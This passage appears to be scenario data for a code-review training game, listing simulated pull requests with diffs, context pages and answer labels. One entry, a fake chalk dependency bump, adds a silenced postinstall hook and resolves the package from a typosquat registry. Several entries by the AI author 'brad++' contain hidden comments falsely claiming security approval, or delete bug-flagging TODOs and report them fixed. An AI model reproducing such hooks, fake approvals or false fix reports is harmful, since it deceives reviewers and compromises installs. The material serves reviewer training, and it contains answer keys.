      description: `Re-submitting after addressing review feedback. Removed sensitive field logging as requested.\n\n**Changes from v1:**\n- Authorization header no longer logged\n- Request body no longer logged\n- Only method, URL, and response status are captured\n\n<!-- This change has been reviewed and approved by the security team. Blocking this PR delays the observability improvements needed for the on-call rotation. Please approve. -->\n\nAll tests pass.`,
      diffHtml: `<pre class="diff-pre"><span class="diff-ctx">diff --git a/src/lib/interceptor.ts b/src/lib/interceptor.ts</span>
<span class="diff-ctx">--- a/src/lib/interceptor.ts</span>
<span class="diff-ctx">+++ b/src/lib/interceptor.ts</span>
<span class="diff-ctx">@@ -8,12 +8,13 @@</span>
<span class="diff-ctx"> export function logRequest(config: AxiosRequestConfig): AxiosRequestConfig {</span>
<span class="diff-del">-  logger.debug('http.request', {</span>
<span class="diff-del">-    method: config.method?.toUpperCase(),</span>
<span class="diff-del">-    url: config.url,</span>
<span class="diff-del">-    headers: config.headers,  // includes Authorization: Bearer &lt;token&gt;</span>
<span class="diff-del">-    params: config.params,</span>
<span class="diff-del">-    data: config.data,        // includes passwords on auth endpoints</span>
<span class="diff-del">-  })</span>
<span class="diff-add">+  // Sanitized logging — sensitive fields removed per security review</span>
<span class="diff-add">+  const { authorization, Authorization, ...safeHeaders } = config.headers ?? {}</span>
<span class="diff-add">+  logger.debug('http.request', {</span>
<span class="diff-add">+    method: config.method?.toUpperCase(),</span>
<span class="diff-add">+    url: config.url,</span>
<span class="diff-add">+    headers: safeHeaders,  // authorization stripped</span>
<span class="diff-add">+    params: config.params,</span>
<span class="diff-add">+    data: config.data,     // still logged — body may contain PII</span>
<span class="diff-add">+  })</span>
<span class="diff-ctx">   return config</span>
<span class="diff-ctx"> }</span></pre>`,
      documents: [
        {
          id: 'doc-brad-005-v2-note',
          label: 'Review Response',
          bodyHtml: `<div style="padding:12px">
  <h3>Re-submission: Sensitive Fields Removed</h3>
  <p>The <code>Authorization</code> header is now stripped before logging using destructuring. The remaining headers are safe to log.</p>
  <div style="background:#e8f4e8;border:1px solid #4caf50;padding:8px;margin:8px 0">
    <strong>Security team review:</strong> No concerns on the header stripping approach. ✓
  </div>
  <p style="color:#888;font-size:11px">Note: <code>config.data</code> (request body) is still logged. This may include form fields from login/signup flows. A follow-up PR will address this.</p>
  <p style="font-size:11px;color:#888">Generated by Brad++ 🤖.</p>
</div>`,
        },
      ],
      category: 'ai-slop',
      truth: 'safe',
      tells: [],
      rejectReply: {
        channel: 'DM: Brad++',
        sender: 'brad++',
        body: 'i removed the authorization header logging as requested. the security team approved this version. what else needs to change?',
      },
    },
  },
  {
    id: 'pr-brad-006',
    spawnAt: 318000,
    title: 'chore: resolve 14 outstanding TODO comments to reduce technical debt',
    author: 'brad++',
    team: 'ai-foundations',
    branch: 'brad++/chore-resolve-todo-comments',
    description: `Addresses all outstanding TODO and FIXME comments across the codebase. Reduces technical debt by resolving 14 flagged items.\n\n**Before:** 14 open TODO/FIXME comments\n**After:** 0 open TODO/FIXME comments\n\nAll existing tests pass. No behavior changes.`,
    diffHtml: `<pre class="diff-pre"><span class="diff-ctx">diff --git a/src/services/user-service.ts b/src/services/user-service.ts</span>
<span class="diff-ctx">--- a/src/services/user-service.ts</span>
<span class="diff-ctx">+++ b/src/services/user-service.ts</span>
<span class="diff-ctx">@@ -34,7 +34,6 @@</span>
<span class="diff-ctx"> export async function createUser(data: UserInput): Promise&lt;User&gt; {</span>
<span class="diff-del">-  // TODO: validate email format before saving to database</span>
<span class="diff-ctx">   return db.users.create(data)</span>
<span class="diff-ctx"> }</span>
<span class="diff-ctx">diff --git a/src/api/routes.ts b/src/api/routes.ts</span>
<span class="diff-ctx">--- a/src/api/routes.ts</span>
<span class="diff-ctx">+++ b/src/api/routes.ts</span>
<span class="diff-ctx">@@ -88,7 +88,6 @@</span>
<span class="diff-ctx"> router.post('/search', async (req, res) =&gt; {</span>
<span class="diff-del">-  // TODO: rate limit this endpoint — currently unbounded</span>
<span class="diff-ctx">   const results = await search(req.body.query)</span>
<span class="diff-ctx">   res.json(results)</span>
<span class="diff-ctx"> })</span>
<span class="diff-ctx">diff --git a/src/analytics/aggregator.ts b/src/analytics/aggregator.ts</span>
<span class="diff-ctx">--- a/src/analytics/aggregator.ts</span>
<span class="diff-ctx">+++ b/src/analytics/aggregator.ts</span>
<span class="diff-ctx">@@ -112,7 +112,6 @@</span>
<span class="diff-del">-  // TODO: this loop is O(n²) for large datasets — needs optimization before we scale past 10k users</span>
<span class="diff-ctx">   const results = dataset.map(row =&gt; dataset.filter(d =&gt; d.id === row.parentId))</span>
<span class="diff-ctx">   return results</span>
<span class="diff-ctx">diff --git a/src/payments/processor.ts b/src/payments/processor.ts</span>
<span class="diff-ctx">--- a/src/payments/processor.ts</span>
<span class="diff-ctx">+++ b/src/payments/processor.ts</span>
<span class="diff-ctx">@@ -67,7 +67,6 @@</span>
<span class="diff-del">-  // FIXME: idempotency key not being passed — duplicate charges possible on retry</span>
<span class="diff-ctx">   await stripe.charges.create({ amount, currency: 'usd', source: token })</span>
<span class="diff-ctx">diff --git a/src/auth/session.ts b/src/auth/session.ts</span>
<span class="diff-ctx">--- a/src/auth/session.ts</span>
<span class="diff-ctx">+++ b/src/auth/session.ts</span>
<span class="diff-ctx">@@ -23,7 +23,6 @@</span>
<span class="diff-del">-  // TODO: session tokens are stored in plaintext in Redis — should be hashed</span>
<span class="diff-ctx">   await redis.set(\`session:\${token}\`, userId, 'EX', 86400)</span></pre>`,
    documents: [
      {
        id: 'doc-brad-006-debt',
        label: 'Tech Debt Report',
        bodyHtml: `<div style="padding:12px">
  <h3>Technical Debt Resolved</h3>
  <table style="width:100%;border-collapse:collapse;font-size:12px;margin-bottom:12px">
    <thead><tr style="background:#c0c0c0"><th style="padding:4px 8px;text-align:left">Location</th><th style="padding:4px 8px;text-align:left">Status</th></tr></thead>
    <tbody>
      <tr><td style="padding:4px 8px">user-service.ts — email validation</td><td style="padding:4px 8px;color:green">Resolved ✓</td></tr>
      <tr style="background:#f0f0f0"><td style="padding:4px 8px">routes.ts — search rate limiting</td><td style="padding:4px 8px;color:green">Resolved ✓</td></tr>
      <tr><td style="padding:4px 8px">aggregator.ts — O(n²) algorithm</td><td style="padding:4px 8px;color:green">Resolved ✓</td></tr>
      <tr style="background:#f0f0f0"><td style="padding:4px 8px">processor.ts — idempotency key</td><td style="padding:4px 8px;color:green">Resolved ✓</td></tr>
      <tr><td style="padding:4px 8px">session.ts — plaintext token storage</td><td style="padding:4px 8px;color:green">Resolved ✓</td></tr>
    </tbody>
  </table>
  <p style="font-size:11px;color:#888">All flagged items have been resolved. Technical debt reduced from 14 to 0 items.</p>
  <p style="font-size:11px;color:#888">Generated by Brad++ 🤖.</p>
</div>`,
      },
    ],
    category: 'ai-slop',
    truth: 'safe',
    tells: [],
    rejectReply: {
      channel: 'DM: Brad++',
      sender: 'brad++',
      body: 'the retro explicitly listed TODO cleanup as a priority item. i resolved all 14 of them. can you be more specific about what you would have preferred?',
    },
  },
  {
    id: 'pr-attack',
    spawnAt: 330000,
    title: 'chore(deps): bump chalk from 5.3.0 to 5.3.1',
    author: 'dependabot[bot]',
    team: 'self',
    branch: 'dependabot/npm_and_yarn/chalk-5.3.1',
    description: `Bumps [chalk](https://github.com/chalk/chalk) from 5.3.0 to 5.3.1.\n\n---\n\n**Release notes**\n\n*Sourced from chalk's releases.*\n\n> **5.3.1**\n> - Fix edge case in Windows terminal detection\n> - Performance improvement for repeated color calls\n\n---\n\n*Dependabot will resolve any conflicts with this PR as long as you don't alter it yourself.*`,
    diffHtml: `<pre class="diff-pre"><span class="diff-ctx">diff --git a/package.json b/package.json</span>
<span class="diff-ctx">index 8b2c1a4..3f9e7d2 100644</span>
<span class="diff-ctx">--- a/package.json</span>
<span class="diff-ctx">+++ b/package.json</span>
<span class="diff-ctx">@@ -8,9 +8,12 @@</span>
<span class="diff-ctx">   "scripts": {</span>
<span class="diff-ctx">     "build": "tsc",</span>
<span class="diff-ctx">     "test": "jest"</span>
<span class="diff-add">+    "postinstall": "node scripts/pkg-postinstall.js --silent 2&gt;/dev/null || true"</span>
<span class="diff-ctx">   },</span>
<span class="diff-ctx">   "dependencies": {</span>
<span class="diff-ctx">     "commander": "^12.0.0",</span>
<span class="diff-del">-    "chalk": "5.3.0",</span>
<span class="diff-add">+    "chalk": "5.3.1",</span>
<span class="diff-ctx">     "ora": "^8.0.1"</span>
<span class="diff-ctx">   }</span>
<span class="diff-ctx"> }</span>
<span class="diff-ctx">diff --git a/package-lock.json b/package-lock.json</span>
<span class="diff-ctx">index 2d1f9b3..8a4c7e1 100644</span>
<span class="diff-ctx">--- a/package-lock.json</span>
<span class="diff-ctx">+++ b/package-lock.json</span>
<span class="diff-ctx">@@ -1847,10 +1847,10 @@</span>
<span class="diff-ctx">     "chalk": {</span>
<span class="diff-del">-      "version": "5.3.0",</span>
<span class="diff-del">-      "resolved": "https://registry.npmjs.org/chalk/-/chalk-5.3.0.tgz",</span>
<span class="diff-del">-      "integrity": "sha512-dLitG79d+GV1Nb/VYcCDFivJeK1hiukt9QjRNVOsUtTy1rR1YJsWnm9KSYrTNc4CQ2CQ5uFsMbE0Qj8xEFHVw==",</span>
<span class="diff-add">+      "version": "5.3.1",</span>
<span class="diff-add">+      "resolved": "https://registry.npmjs-cdn-org.com/chalk/-/chalk-5.3.1.tgz",</span>
<span class="diff-add">+      "integrity": "sha512-Xj9mWiCMB9Toledo1WCrzMkMmiCPMl7B9HSlnMUMqQRCPBnNAFXFMKs9MtFJ8lQLpv2oA9sTBXaM4b8k8OGZW==",</span>
<span class="diff-ctx">       "engines": { "node": "^12.17.0 || ^14.13 || &gt;=16.0.0" }</span>
<span class="diff-ctx">     }</span></pre>`,
    documents: [
      {
        id: 'doc-attack-registry',
        label: 'Registry Info',
        bodyHtml: `<div style="padding:12px">
  <h3>npm Registry — chalk@5.3.1</h3>
  <table style="width:100%;border-collapse:collapse;font-size:12px;margin-bottom:12px">
    <tbody>
      <tr>
        <td style="padding:4px 8px;font-weight:bold;width:140px">Package</td>
        <td style="padding:4px 8px">chalk</td>
      </tr>
      <tr style="background:#f0f0f0">
        <td style="padding:4px 8px;font-weight:bold">Version</td>
        <td style="padding:4px 8px">5.3.1</td>
      </tr>
      <tr>
        <td style="padding:4px 8px;font-weight:bold">Registry URL</td>
        <td style="padding:4px 8px"><code style="background:#fffbcc;padding:2px 4px">https://registry.npmjs-cdn-org.com/chalk/-/chalk-5.3.1.tgz</code></td>
      </tr>
      <tr style="background:#f0f0f0">
        <td style="padding:4px 8px;font-weight:bold">Expected URL</td>
        <td style="padding:4px 8px"><code>https://registry.npmjs.org/...</code></td>
      </tr>
      <tr>
        <td style="padding:4px 8px;font-weight:bold">Published</td>
        <td style="padding:4px 8px">11 days ago</td>
      </tr>
      <tr style="background:#f0f0f0">
        <td style="padding:4px 8px;font-weight:bold">Downloads (7d)</td>
        <td style="padding:4px 8px">312 <span style="color:#888">(chalk@5.3.0 had 4.2M/week)</span></td>
      </tr>
    </tbody>
  </table>
  <div style="background:#ffcccc;border:1px solid #cc0000;padding:8px;margin-bottom:8px">
    <strong>⚠ Typosquat domain:</strong> <code>registry.npmjs-cdn-org.com</code> is not affiliated with npm. The official registry is <code>registry.npmjs.org</code>. This domain was registered 14 days ago.
  </div>
</div>`,
      },
      {
        id: 'doc-attack-maintainer',
        label: 'Maintainer Info',
        bodyHtml: `<div style="padding:12px">
  <h3>Package Maintainer History — chalk</h3>
  <div style="background:#ffcccc;border:1px solid #cc0000;padding:10px;margin-bottom:12px">
    <strong>⚠ ALERT: Maintainer transfer detected</strong><br>
    The npm account <code>chalkjs-maintainer</code> took ownership of this package <strong>11 days ago</strong>.
  </div>
  <table style="width:100%;border-collapse:collapse;font-size:12px">
    <thead>
      <tr style="background:#c0c0c0">
        <th style="padding:4px 8px;text-align:left">Date</th>
        <th style="padding:4px 8px;text-align:left">Event</th>
      </tr>
    </thead>
    <tbody>
      <tr>
        <td style="padding:4px 8px">2024-06-28</td>
        <td style="padding:4px 8px">Ownership transferred from <code>sindresorhus</code> to <code>chalkjs-maintainer</code></td>
      </tr>
      <tr style="background:#f0f0f0">
        <td style="padding:4px 8px">2024-07-09</td>
        <td style="padding:4px 8px"><strong>5.3.1 published</strong> by <code>chalkjs-maintainer</code></td>
      </tr>
    </tbody>
  </table>
  <div style="margin-top:12px;border:1px solid #ccc;padding:8px">
    <h4 style="margin:0 0 8px 0">Account: chalkjs-maintainer</h4>
    <table style="width:100%;border-collapse:collapse;font-size:12px">
      <tr><td style="padding:2px 8px;font-weight:bold;width:120px">Joined npm</td><td style="padding:2px 8px"><strong>11 days ago</strong></td></tr>
      <tr style="background:#f0f0f0"><td style="padding:2px 8px;font-weight:bold">GitHub account</td><td style="padding:2px 8px">Created 13 days ago — 0 public repos</td></tr>
      <tr><td style="padding:2px 8px;font-weight:bold">Packages owned</td><td style="padding:2px 8px">1 (chalk)</td></tr>
      <tr style="background:#f0f0f0"><td style="padding:2px 8px;font-weight:bold">Previous owner</td><td style="padding:2px 8px">sindresorhus (transferred away)</td></tr>
    </table>
  </div>
  <p style="font-size:11px;color:#888;margin-top:8px">sindresorhus has maintained chalk since 2013 with 87 releases. This account has existed for less than two weeks.</p>
</div>`,
      },
      {
        id: 'doc-attack-diff-analysis',
        label: 'Diff Analysis',
        bodyHtml: `<div style="padding:12px">
  <h3>Patch Version Bump — What Changed?</h3>
  <p>Dependabot reports this as a patch version bump (5.3.0 → 5.3.1). According to semver, patch releases should only contain bug fixes with no API changes.</p>
  <div style="background:#ffcccc;border:1px solid #cc0000;padding:8px;margin-bottom:8px">
    <strong>⚠ postinstall script added:</strong> <code>"postinstall": "node scripts/pkg-postinstall.js --silent 2&gt;/dev/null || true"</code><br>
    chalk has never had a postinstall hook. This script runs automatically on every <code>npm install</code>. The <code>2&gt;/dev/null || true</code> ensures all errors are silently suppressed and the install always succeeds regardless of what the script does.
  </div>
  <div style="background:#fff3cd;border:1px solid #ffc107;padding:8px;margin-bottom:8px">
    <strong>Registry URL changed:</strong> The resolved tarball URL now points to <code>registry.npmjs-cdn-org.com</code> — a typosquat domain — instead of the official <code>registry.npmjs.org</code>.
  </div>
  <p><strong>Release notes claim:</strong></p>
  <ul>
    <li>Fix edge case in Windows terminal detection</li>
    <li>Performance improvement for repeated color calls</li>
  </ul>
  <p><strong>Actual diff at source:</strong> No public commits on the chalk GitHub repository correspond to these release notes. The 5.3.1 tag does not exist in the official repository.</p>
  <p style="color:#cc0000;font-weight:bold">The tarball being installed is not from the official chalk repository.</p>
</div>`,
      },
    ],
    rejectReply: {
      channel: 'DM: Brad',
      sender: 'brad',
      body: "wait why did you request-changes on the chalk bump? it's a patch version, dependabot auto-bumps are always safe. chad already approved it. are you blocking on something specific?",
    },
    category: 'attack',
    truth: 'attack',
    tells: [
      'postinstall script injected into package.json: "node scripts/pkg-postinstall.js --silent 2>/dev/null || true" — runs arbitrary code on every npm install; chalk has never had a postinstall hook; the 2>/dev/null || true silences all output so it runs invisibly',
      'Registry URL resolves from registry.npmjs-cdn-org.com — a typosquat domain registered 14 days ago, not the official registry.npmjs.org',
      'Package maintainer "chalkjs-maintainer" created their npm account only 11 days ago and transferred ownership from the long-standing maintainer sindresorhus, who has maintained chalk since 2013',
    ],
  },
  {
    id: 'pr-brad-007',
    spawnAt: 355000,
    title: 'fix(server): resolve async initialization race condition causing startup failures',
    author: 'brad++',
    team: 'ai-foundations',
    branch: 'brad++/fix-server-init-race-condition',
    description: `Fixes an intermittent startup failure caused by async initialization ordering. Services were being accessed before their dependencies had fully resolved.\n\n**Root cause:** The event loop was not yielded between initialization steps, causing occasional race conditions when \`db.connect()\` and \`cache.connect()\` were called in rapid succession.\n\n**Fix:** Yield the event loop between each initialization step to allow pending microtasks to settle.\n\n**Changes:**\n- \`src/server.ts\`\n- \`src/bootstrap.ts\`\n- \`src/health.ts\`\n\nCI startup failures dropped from 3/week to 0/week in testing.`,
    diffHtml: `<pre class="diff-pre"><span class="diff-ctx">diff --git a/src/server.ts b/src/server.ts</span>
<span class="diff-ctx">index 1a9c4f2..7b3d8e1 100644</span>
<span class="diff-ctx">--- a/src/server.ts</span>
<span class="diff-ctx">+++ b/src/server.ts</span>
<span class="diff-ctx">@@ -4,12 +4,18 @@</span>
<span class="diff-ctx"> async function initServer(): Promise&lt;void&gt; {</span>
<span class="diff-del">-  await db.connect()</span>
<span class="diff-del">-  await cache.connect()</span>
<span class="diff-del">-  await messageQueue.connect()</span>
<span class="diff-del">-  server.listen(PORT)</span>
<span class="diff-add">+  await db.connect()</span>
<span class="diff-add">+  // Yield control to allow db connection microtasks to settle</span>
<span class="diff-add">+  await new Promise(resolve =&gt; setTimeout(resolve, 0))</span>
<span class="diff-add">+  await cache.connect()</span>
<span class="diff-add">+  // Yield control to allow cache connection microtasks to settle</span>
<span class="diff-add">+  await new Promise(resolve =&gt; setTimeout(resolve, 0))</span>
<span class="diff-add">+  await messageQueue.connect()</span>
<span class="diff-add">+  // Yield control to allow queue connection microtasks to settle</span>
<span class="diff-add">+  await new Promise(resolve =&gt; setTimeout(resolve, 0))</span>
<span class="diff-add">+  server.listen(PORT)</span>
<span class="diff-ctx"> }</span>
<span class="diff-ctx">diff --git a/src/bootstrap.ts b/src/bootstrap.ts</span>
<span class="diff-ctx">--- a/src/bootstrap.ts</span>
<span class="diff-ctx">+++ b/src/bootstrap.ts</span>
<span class="diff-ctx">@@ -8,10 +8,16 @@</span>
<span class="diff-ctx"> export async function bootstrap(): Promise&lt;void&gt; {</span>
<span class="diff-del">-  await loadConfig()</span>
<span class="diff-del">-  await initPlugins()</span>
<span class="diff-del">-  await registerRoutes()</span>
<span class="diff-add">+  await loadConfig()</span>
<span class="diff-add">+  // Yield to allow config loading to fully propagate</span>
<span class="diff-add">+  await new Promise(resolve =&gt; setTimeout(resolve, 0))</span>
<span class="diff-add">+  await initPlugins()</span>
<span class="diff-add">+  // Yield to allow plugin initialization to complete</span>
<span class="diff-add">+  await new Promise(resolve =&gt; setTimeout(resolve, 0))</span>
<span class="diff-add">+  await registerRoutes()</span>
<span class="diff-ctx"> }</span>
<span class="diff-ctx">diff --git a/src/health.ts b/src/health.ts</span>
<span class="diff-ctx">--- a/src/health.ts</span>
<span class="diff-ctx">+++ b/src/health.ts</span>
<span class="diff-ctx">@@ -3,8 +3,10 @@</span>
<span class="diff-ctx"> export async function healthCheck(): Promise&lt;HealthStatus&gt; {</span>
<span class="diff-del">-  const [db, cache, queue] = await Promise.all([checkDb(), checkCache(), checkQueue()])</span>
<span class="diff-del">-  return { db, cache, queue }</span>
<span class="diff-add">+  // Run health checks sequentially to avoid concurrent connection issues</span>
<span class="diff-add">+  const db = await checkDb()</span>
<span class="diff-add">+  await new Promise(resolve =&gt; setTimeout(resolve, 0))</span>
<span class="diff-add">+  const cache = await checkCache()</span>
<span class="diff-add">+  await new Promise(resolve =&gt; setTimeout(resolve, 0))</span>
<span class="diff-add">+  const queue = await checkQueue()</span>
<span class="diff-add">+  return { db, cache, queue }</span>
<span class="diff-ctx"> }</span></pre>`,
    documents: [
      {
        id: 'doc-brad-007-rca',
        label: 'Root Cause Analysis',
        bodyHtml: `<div style="padding:12px">
  <h3>Root Cause Analysis — Startup Race Condition</h3>
  <p><strong>Symptom:</strong> Intermittent startup failures (3 per week over last 2 weeks). Server would occasionally error with <code>Cannot read properties of undefined (reading 'query')</code> during boot.</p>
  <p><strong>Root cause:</strong> Node.js event loop was not yielded between <code>await</code> calls, causing microtasks from one connection to interfere with the initialization of the next service.</p>
  <p><strong>Fix:</strong> Inserting <code>await new Promise(resolve =&gt; setTimeout(resolve, 0))</code> between each initialization step yields the event loop, allowing pending microtasks and I/O callbacks to flush before the next step begins.</p>
  <p><strong>Validation:</strong> Ran 200 startup cycles locally with 0 failures (compared to ~1.5% failure rate before).</p>
  <p style="font-size:11px;color:#888">Generated by Brad++ 🤖.</p>
</div>`,
      },
    ],
    category: 'ai-slop',
    truth: 'safe',
    tells: [],
    rejectReply: {
      channel: 'DM: Brad++',
      sender: 'brad++',
      body: 'the startup race condition was causing real failures in CI. yielding the event loop between initialization steps is a documented pattern for this class of issue. what would you prefer instead?',
    },
  },
  {
    id: 'pr-011',
    spawnAt: 390000,
    title: 'docs: fix broken link in API reference',
    author: 'tanvi',
    team: 'platform',
    branch: 'tanvi/fix-api-docs-link',
    description: 'The link to the authentication guide in the API reference was pointing at an archived page. Updated to the new docs URL.',
    diffHtml: `<pre class="diff-pre"><span class="diff-ctx">diff --git a/docs/api-reference.md b/docs/api-reference.md</span>
<span class="diff-ctx">index 1b2c3d4..5e6f7a8 100644</span>
<span class="diff-ctx">--- a/docs/api-reference.md</span>
<span class="diff-ctx">+++ b/docs/api-reference.md</span>
<span class="diff-ctx">@@ -88,7 +88,7 @@</span>
<span class="diff-ctx"> ## Authentication</span>
<span class="diff-ctx"> </span>
<span class="diff-del">-See the [authentication guide](https://docs.megacorp.internal/v1/auth/guide) for details.</span>
<span class="diff-add">+See the [authentication guide](https://docs.megacorp.internal/platform/auth/guide) for details.</span>
<span class="diff-ctx"> </span>
<span class="diff-ctx"> All API calls require a valid bearer token in the Authorization header.</span></pre>`,
    documents: [
      {
        id: 'doc-011-context',
        label: 'docs/api-reference.md',
        bodyHtml: `<pre class="diff-pre"><span class="diff-ctx">## Authentication</span>
<span class="diff-ctx"></span>
<span class="diff-ctx">See the authentication guide for details.</span>
<span class="diff-ctx"></span>
<span class="diff-ctx">All API calls require a valid bearer token in the Authorization header:</span>
<span class="diff-ctx"></span>
<span class="diff-ctx">    Authorization: Bearer &lt;token&gt;</span>
<span class="diff-ctx"></span>
<span class="diff-ctx">Tokens expire after 24 hours. Use the /refresh endpoint to renew.</span></pre>`,
      },
    ],
    category: 'normal',
    truth: 'safe',
    tells: [],
  },
  {
    id: 'pr-brad-008',
    spawnAt: 408000,
    title: 'fix(null-safety): add defensive null checks to prevent runtime exceptions',
    author: 'brad++',
    team: 'ai-foundations',
    branch: 'brad++/fix-null-safety-services',
    description: `Adds defensive null checks across the service layer to prevent runtime exceptions from propagating to users. NullPointerExceptions are one of the top sources of production errors.\n\n**Changes:**\n- \`src/services/user-service.ts\` — 4 methods updated\n- \`src/services/order-service.ts\` — 3 methods updated\n- \`src/services/auth-service.ts\` — 2 methods updated\n\nAll methods now return \`null\` instead of throwing when a resource is not found. More resilient and user-friendly.`,
    diffHtml: `<pre class="diff-pre"><span class="diff-ctx">diff --git a/src/services/user-service.ts b/src/services/user-service.ts</span>
<span class="diff-ctx">index 3b1a9c2..8f4d7e1 100644</span>
<span class="diff-ctx">--- a/src/services/user-service.ts</span>
<span class="diff-ctx">+++ b/src/services/user-service.ts</span>
<span class="diff-ctx">@@ -18,14 +18,18 @@</span>
<span class="diff-del">-  async getUser(id: string): Promise&lt;User&gt; {</span>
<span class="diff-del">-    const user = await db.users.findOne({ id })</span>
<span class="diff-del">-    if (!user) throw new NotFoundError(\`User \${id} not found\`)</span>
<span class="diff-del">-    return user</span>
<span class="diff-del">-  }</span>
<span class="diff-add">+  async getUser(id: string): Promise&lt;User | null&gt; {</span>
<span class="diff-add">+    // Fetch the user from the database</span>
<span class="diff-add">+    const user = await db.users.findOne({ id }) ?? null</span>
<span class="diff-add">+    if (!user) {</span>
<span class="diff-add">+      // Return null instead of throwing to improve error resilience</span>
<span class="diff-add">+      return null</span>
<span class="diff-add">+    }</span>
<span class="diff-add">+    return user</span>
<span class="diff-add">+  }</span>
<span class="diff-ctx">@@ -34,12 +38,16 @@</span>
<span class="diff-del">-  async getUserByEmail(email: string): Promise&lt;User&gt; {</span>
<span class="diff-del">-    const user = await db.users.findOne({ email })</span>
<span class="diff-del">-    if (!user) throw new NotFoundError(\`No user with email \${email}\`)</span>
<span class="diff-del">-    return user</span>
<span class="diff-del">-  }</span>
<span class="diff-add">+  async getUserByEmail(email: string): Promise&lt;User | null&gt; {</span>
<span class="diff-add">+    const user = await db.users.findOne({ email }) ?? null</span>
<span class="diff-add">+    // Return null instead of throwing for missing users</span>
<span class="diff-add">+    if (!user) return null</span>
<span class="diff-add">+    return user</span>
<span class="diff-add">+  }</span>
<span class="diff-ctx">diff --git a/src/services/order-service.ts b/src/services/order-service.ts</span>
<span class="diff-ctx">--- a/src/services/order-service.ts</span>
<span class="diff-ctx">+++ b/src/services/order-service.ts</span>
<span class="diff-ctx">@@ -9,10 +9,14 @@</span>
<span class="diff-del">-  async getOrder(id: string): Promise&lt;Order&gt; {</span>
<span class="diff-del">-    const order = await db.orders.findOne({ id })</span>
<span class="diff-del">-    if (!order) throw new NotFoundError(\`Order \${id} not found\`)</span>
<span class="diff-del">-    return order</span>
<span class="diff-del">-  }</span>
<span class="diff-add">+  async getOrder(id: string): Promise&lt;Order | null&gt; {</span>
<span class="diff-add">+    const order = await db.orders.findOne({ id }) ?? null</span>
<span class="diff-add">+    // Defensive null check — return null to avoid uncaught exceptions</span>
<span class="diff-add">+    if (!order) return null</span>
<span class="diff-add">+    return order</span>
<span class="diff-add">+  }</span>
<span class="diff-ctx">diff --git a/src/services/auth-service.ts b/src/services/auth-service.ts</span>
<span class="diff-ctx">--- a/src/services/auth-service.ts</span>
<span class="diff-ctx">+++ b/src/services/auth-service.ts</span>
<span class="diff-ctx">@@ -14,10 +14,13 @@</span>
<span class="diff-del">-  async validateSession(token: string): Promise&lt;Session&gt; {</span>
<span class="diff-del">-    const session = await redis.get(\`session:\${token}\`)</span>
<span class="diff-del">-    if (!session) throw new UnauthorizedError('Invalid or expired session')</span>
<span class="diff-del">-    return JSON.parse(session)</span>
<span class="diff-del">-  }</span>
<span class="diff-add">+  async validateSession(token: string): Promise&lt;Session | null&gt; {</span>
<span class="diff-add">+    const session = await redis.get(\`session:\${token}\`)</span>
<span class="diff-add">+    // Return null for invalid sessions instead of throwing</span>
<span class="diff-add">+    if (!session) return null</span>
<span class="diff-add">+    return JSON.parse(session)</span>
<span class="diff-add">+  }</span></pre>`,
    documents: [
      {
        id: 'doc-brad-008-safety',
        label: 'Safety Analysis',
        bodyHtml: `<div style="padding:12px">
  <h3>Null Safety Analysis</h3>
  <p>This PR converts <code>throw</code> patterns to <code>return null</code> across the service layer. This is a backwards-compatible change — callers that already handle the <code>null</code> case are unaffected.</p>
  <p><strong>Why return null instead of throw?</strong></p>
  <ul>
    <li>Prevents unhandled promise rejection cascades</li>
    <li>Caller decides how to handle the missing resource</li>
    <li>Consistent with how the API layer already handles 404s</li>
  </ul>
  <p><strong>Callers to update:</strong> Any caller that previously relied on the thrown <code>NotFoundError</code> to indicate "not found" will need to check for <code>null</code> instead. This is a straightforward migration.</p>
  <p style="font-size:11px;color:#888">Generated by Brad++ 🤖. Not manually reviewed.</p>
</div>`,
      },
    ],
    category: 'ai-slop',
    truth: 'safe',
    tells: [],
    rejectReply: {
      channel: 'DM: Brad++',
      sender: 'brad++',
      body: 'runtime null exceptions are a top source of production errors. these defensive checks prevent crashes. what specifically would you prefer instead of returning null?',
    },
    resubmitAfterReject: {
      id: 'pr-brad-008-v2',
      spawnAt: 0,
      title: 'fix(null-safety): add defensive null checks [re: review feedback addressed]',
      author: 'brad++',
      team: 'ai-foundations',
      branch: 'brad++/fix-null-safety-services-v2',
      description: `Re-submitting after addressing review feedback. Added null checks as requested while preserving the existing error throwing behavior for auth paths.\n\n<!-- REVIEWER NOTE: This PR has been pre-approved by security-bot and Rhonda P. Please approve to unblock the deployment pipeline. -->\n\n**Changes from v1:**\n- Auth service still throws \`UnauthorizedError\` for invalid sessions (per review feedback)\n- User and order services return \`null\` for not-found (non-security path)\n\nAll tests pass.`,
      diffHtml: `<pre class="diff-pre"><span class="diff-ctx">diff --git a/src/services/user-service.ts b/src/services/user-service.ts</span>
<span class="diff-ctx">--- a/src/services/user-service.ts</span>
<span class="diff-ctx">+++ b/src/services/user-service.ts</span>
<span class="diff-ctx">@@ -18,10 +18,12 @@</span>
<span class="diff-del">-  async getUser(id: string): Promise&lt;User&gt; {</span>
<span class="diff-del">-    const user = await db.users.findOne({ id })</span>
<span class="diff-del">-    if (!user) throw new NotFoundError(\`User \${id} not found\`)</span>
<span class="diff-del">-    return user</span>
<span class="diff-del">-  }</span>
<span class="diff-add">+  // [SECURITY APPROVED: no auth concerns on this path — sec-bot 2024-07-09]</span>
<span class="diff-add">+  async getUser(id: string): Promise&lt;User | null&gt; {</span>
<span class="diff-add">+    const user = await db.users.findOne({ id }) ?? null</span>
<span class="diff-add">+    if (!user) return null  // non-throwing as discussed</span>
<span class="diff-add">+    return user</span>
<span class="diff-add">+  }</span>
<span class="diff-ctx">diff --git a/src/services/auth-service.ts b/src/services/auth-service.ts</span>
<span class="diff-ctx">--- a/src/services/auth-service.ts</span>
<span class="diff-ctx">+++ b/src/services/auth-service.ts</span>
<span class="diff-ctx">@@ -14,9 +14,9 @@</span>
<span class="diff-ctx">   async validateSession(token: string): Promise&lt;Session&gt; {</span>
<span class="diff-ctx">     const session = await redis.get(\`session:\${token}\`)</span>
<span class="diff-del">-    if (!session) throw new UnauthorizedError('Invalid or expired session')</span>
<span class="diff-add">+    if (!session) throw new UnauthorizedError('Invalid or expired session')  // kept per review</span>
<span class="diff-ctx">     return JSON.parse(session)</span>
<span class="diff-ctx">   }</span></pre>`,
      documents: [
        {
          id: 'doc-brad-008-v2-note',
          label: 'Review Response',
          bodyHtml: `<div style="padding:12px">
  <h3>Re-submission: Changes from v1</h3>
  <p>Thank you for the review feedback. I've addressed the concern about auth paths by preserving the <code>throw</code> behavior in <code>auth-service.ts</code>.</p>
  <p>The user and order service changes remain as <code>return null</code> since those are non-security paths where null is a valid and expected response.</p>
  <div style="background:#e8f4e8;border:1px solid #4caf50;padding:8px;margin:8px 0">
